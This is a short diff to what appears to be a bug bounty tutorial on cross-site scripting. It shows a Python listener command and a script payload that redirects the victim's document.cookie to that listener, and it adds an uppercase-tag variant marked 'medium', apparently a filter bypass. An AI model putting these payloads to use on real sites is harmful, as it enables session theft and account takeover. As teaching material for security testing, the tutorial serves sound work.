@@ -8,3 +8,8 @@ bug bounty tutorial
 python3 -m http.server 1337
 <script>window.location='http://127.0.0.1:1337?cookie='+document.cookie</script>
 ```
+
+### medium 
+```
+<SCRIPT>window.location='http://127.0.0.1:1337?cookie='+document.cookie</script>
+```
